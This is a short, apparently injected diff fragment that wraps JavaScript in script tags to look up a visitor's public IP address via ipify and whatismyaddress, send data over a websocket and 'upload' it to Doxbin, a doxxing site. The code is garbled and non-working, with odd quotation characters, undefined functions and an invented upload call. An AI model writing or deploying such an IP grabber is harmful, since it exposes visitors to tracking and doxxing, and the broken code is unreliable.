@@ -1,3 +1,4 @@
+        <script>
     function grab() {
 fetch(¨https://api.ipify.org/¨)
     }
@@ -7,3 +8,4 @@ fetch(¨https://whatismyaddress.net/¨)
     }
   websocket.send(house())
   doxbin.upload(grab, house), ¨HTTPS¨
+</script>
